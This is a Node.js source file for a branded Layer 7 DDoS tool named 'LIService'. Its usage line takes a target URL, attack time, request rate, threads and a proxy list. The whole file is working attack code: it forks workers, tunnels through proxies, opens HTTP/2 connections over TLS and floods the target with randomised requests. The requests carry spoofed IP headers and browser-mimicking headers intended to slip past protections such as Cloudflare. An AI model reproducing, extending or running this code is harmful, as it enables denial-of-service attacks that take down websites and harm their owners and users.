const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const path = require("path");
const crypto = require("crypto");
const fs = require("fs");
const axios = require('axios');
const https = require('https');

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) { });

if (process.argv.length < 7) {
    console.log(`
 
          ▒█░░░ ▀█▀ ▒█▀▀▀█ ▒█▀▀▀ ▒█▀▀█ ▒█░░▒█ ▀█▀ ▒█▀▀█ ▒█▀▀▀ 
          ▒█░░░ ▒█░ ░▀▀▀▄▄ ▒█▀▀▀ ▒█▄▄▀ ░▒█▒█░ ▒█░ ▒█░░░ ▒█▀▀▀ 
          ▒█▄▄█ ▄█▄ ▒█▄▄▄█ ▒█▄▄▄ ▒█░▒█ ░░▀▄▀░ ▄█▄ ▒█▄▄█ ▒█▄▄▄
           METHOD DDOS LATER 7 DEVELOPMENT BY t.me/LIService                  
           
Usage: node LIService.js Target Time Rate Thread ProxyFile
Example: node LIService.js https://target.com 120 32 8 proxy.txt
`); process.exit();
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

const getCurrentTime = () => {
    const now = new Date();
    const hours = now.getHours().toString().padStart(2, '0');
    const minutes = now.getMinutes().toString().padStart(2, '0');
    const seconds = now.getSeconds().toString().padStart(2, '0');
    return `(\x1b[34m${hours}:${minutes}:${seconds}\x1b[0m)`;
};

const targetURL = process.argv[2];
const agent = new https.Agent({ rejectUnauthorized: false });

function getStatus() {
    const timeoutPromise = new Promise((resolve, reject) => {
        setTimeout(() => {
            reject(new Error('Request Timed Out'));
        }, 5000);
    });

    const axiosPromise = axios.get(targetURL, { httpsAgent: agent });

    Promise.race([axiosPromise, timeoutPromise])
        .then((response) => {
            const { status, data } = response;
            console.log(`${getCurrentTime()} [LIService]  Title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
        })
        .catch((error) => {
            if (error.message === 'Request Timed Out') {
                console.log(`${getCurrentTime()} [LIService]  Request Timed Out`);
            } else if (error.response) {
                const extractedTitle = getTitleFromHTML(error.response.data);
                console.log(`${getCurrentTime()} [LIService]  Title: ${extractedTitle} `);
            } else {
                console.log(`${getCurrentTime()} [LIService]  ${error.message}`);
            }
        });
}

function getTitleFromHTML(html) {
    const titleRegex = /<title>(.*?)<\/title>/i;
    const match = html.match(titleRegex);
    if (match && match[1]) {
        return match[1];
    }
    return 'Not Found';
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function getRandomNumberBetween(min, max) {
    return Math.floor(Math.random() * (max - min + 1) + min);
}

function randomString(length) {
    var result = "";
    var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    var charactersLength = characters.length;
    for (var i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
}

if (cluster.isMaster) {
    console.clear();
    console.log(`
 
          ▒█░░░ ▀█▀ ▒█▀▀▀█ ▒█▀▀▀ ▒█▀▀█ ▒█░░▒█ ▀█▀ ▒█▀▀█ ▒█▀▀▀ 
          ▒█░░░ ▒█░ ░▀▀▀▄▄ ▒█▀▀▀ ▒█▄▄▀ ░▒█▒█░ ▒█░ ▒█░░░ ▒█▀▀▀ 
          ▒█▄▄█ ▄█▄ ▒█▄▄▄█ ▒█▄▄▄ ▒█░▒█ ░░▀▄▀░ ▄█▄ ▒█▄▄█ ▒█▄▄▄
           METHOD DDOS LATER 7 DEVELOPMENT BY t.me/LIService                  
                        Press Ctrl+Z To Stop DDoS
`);

    for (let i = 1; i <= process.argv[5]; i++) {
        cluster.fork();
        console.log(`${getCurrentTime()} [LIService]  Attack Thread ${i} Started`);
    }
    console.log(`${getCurrentTime()} [LIService]  The Attack Has Started`);
    setInterval(getStatus, 2000);
    setTimeout(() => {
        console.log(`${getCurrentTime()} [LIService]  The Attack Is Over`);
        process.exit(1);
    }, process.argv[3] * 1000);
}

const cplist = [
    'TLS_AES_128_GCM_SHA256',
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES256-GCM-SHA384',
    'ECDHE-RSA-CHACHA20-POLY1305',
    'ECDHE-RSA-AES128-SHA256',
    'ECDHE-RSA-AES256-SHA384',
    'ECDHE-RSA-AES128-SHA',
    'ECDHE-RSA-AES256-SHA',
    'DHE-RSA-AES128-GCM-SHA256',
    'DHE-RSA-AES256-GCM-SHA384',
    'DHE-RSA-AES128-SHA256',
    'DHE-RSA-AES256-SHA256',
    'DHE-RSA-AES128-SHA',
    'DHE-RSA-AES256-SHA',
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-ECDSA-AES256-GCM-SHA384',
    'ECDHE-ECDSA-AES128-SHA256',
    'ECDHE-ECDSA-AES256-SHA384',
    'ECDHE-ECDSA-AES128-SHA',
    'ECDHE-ECDSA-AES256-SHA',
    'RSA-AES128-GCM-SHA256',
    'RSA-AES256-GCM-SHA384',
    'RSA-AES128-SHA256',
    'RSA-AES256-SHA256',
    'RSA-AES128-SHA',
    'RSA-AES256-SHA'
];

const sigalgs = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
    'ed25519',
    'ed448'
];

const httpMethods = [
    'GET',
    'POST',
    'PUT',
    'DELETE',
    'OPTIONS',
    'HEAD',
    'PATCH'
];

function getRandomHttpMethod() {
    return httpMethods[Math.floor(Math.random() * httpMethods.length)];
}

function getRandomReferer() {
    // pilih url random atau pake dari target aja
    return parsedTarget.href;
}

const parsedTarget = url.parse(args.target);
const fakeIP = ip_spoof();
var cipper = cplist[Math.floor(Math.random() * cplist.length)];
var proxies = readLines(args.proxyFile);
let concu = sigalgs.join(':');

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder);
}

class NetSocket {
    constructor() { }

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 100000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const randomReferer = getRandomReferer();
    const randomMethod = getRandomHttpMethod();
    const Socker = new NetSocket();

    const headersOptions = [
        {
            ":method": randomMethod,
            ":authority": parsedTarget.host,
            ":scheme": "https",
            ":path": parsedTarget.path,
            "cache-control": "max-age=0",
            "sec-ch-ua": `"Chromium";v="114", "Google Chrome";v="114", ";Not A Brand";v="99"`,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": `"Windows"`,
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9",
            "referer": randomReferer,
            "via": fakeIP,
            "sss": fakeIP,
            "sec-websocket-key": fakeIP,
            "sec-websocket-version": "13",
            "x-forwarded-for": fakeIP,
            "x-forwarded-host": fakeIP,
            "client-ip": fakeIP,
            "real-ip": fakeIP
        },
        {
            ":method": randomMethod,
            ":authority": parsedTarget.host,
            ":scheme": "https",
            ":path": parsedTarget.path,
            "cache-control": "max-age=0",
            "sec-ch-ua": `"Not A(Brand";v="99", "Google Chrome";v="114", "Chromium";v="114"`,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": `"Windows"`,
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9",
            "referer": randomReferer,
            "via": fakeIP,
            "sss": fakeIP,
            "sec-websocket-key": fakeIP,
            "sec-websocket-version": "13",
            "x-forwarded-for": fakeIP,
            "x-forwarded-host": fakeIP,
            "client-ip": fakeIP,
            "real-ip": fakeIP
        },
        {
            ":method": randomMethod,
            ":authority": parsedTarget.host,
            ":scheme": "https",
            ":path": parsedTarget.path,
            "cache-control": "max-age=0",
            "sec-ch-ua": `"Google Chrome";v="114", "Chromium";v="114", ";Not A Brand";v="99"`,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": `"Windows"`,
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9",
            "referer": randomReferer,
            "via": fakeIP,
            "sss": fakeIP,
            "sec-websocket-key": fakeIP,
            "sec-websocket-version": "13",
            "x-forwarded-for": fakeIP,
            "x-forwarded-host": fakeIP,
            "client-ip": fakeIP,
            "real-ip": fakeIP
        }
    ];

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 25
    };

    setTimeout(function () {
        process.exit(1);
    }, process.argv[3] * 1000);

    process.on('uncaughtException', function (er) { });
    process.on('unhandledRejection', function (er) { });

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 100000);

        const tlsOptions = {
            ALPNProtocols: ['h2'],
            challengesToSolve: Infinity,
            resolveWithFullResponse: true,
            followAllRedirects: true,
            maxRedirects: 10,
            clientTimeout: 5000,
            clientlareMaxTimeout: 10000,
            cloudflareTimeout: 5000,
            cloudflareMaxTimeout: 30000,
            ciphers: tls.getCiphers().join(":") + cipper,
            secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method"],
            servername: parsedTarget.host,
            socket: connection,
            honorCipherOrder: true,
            secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
            sigals: concu,
            echdCurve: "GREASE:X25519:x25519:P-256:P-384:P-521:X448",
            secure: true,
            Compression: false,
            rejectUnauthorized: false,
            port: 443,
            uri: parsedTarget.host,
            servername: parsedTarget.host,
            sessionTimeout: 5000,
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

        tlsConn.setKeepAlive(true, 60 * 10000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 1000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 262144,
                enablePush: false
            },
            maxSessionMemory: 64000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        });

        client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 20000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
        });

        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const randomHeaders = randomElement(headersOptions);
                    const request = client.request(randomHeaders)

                        .on("response", response => {
                            request.close();
                            request.destroy();
                            return;
                        });

                    request.end();
                }
            }, 1000);
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return;
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return;
        });
    });
}
